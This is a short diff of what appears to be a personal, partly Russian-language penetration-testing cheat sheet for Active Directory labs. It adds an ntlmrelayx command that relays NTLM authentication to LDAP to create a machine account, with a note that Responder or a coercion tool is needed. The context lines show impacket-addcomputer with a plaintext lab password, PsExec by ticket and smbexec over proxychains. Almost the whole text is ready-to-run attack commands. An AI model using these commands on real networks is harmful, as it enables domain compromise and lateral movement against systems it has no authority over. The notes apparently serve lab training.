@@ -448,6 +448,8 @@ https://github.com/mxdelta/SecLists/blob/master/Discovery/DNS/subdomains-top1mil
 
 		impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -computer-name 'Evil-PC' -computer-pass 'Password123'
 
+		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'  (через ntlmrelay) + нужна провокация на идентификацию respnder or coerser)
+  		
  * PSEXEC ПО БЕЛЕТУ PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
 * smbexec xthtp ntlmrelay  proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
 
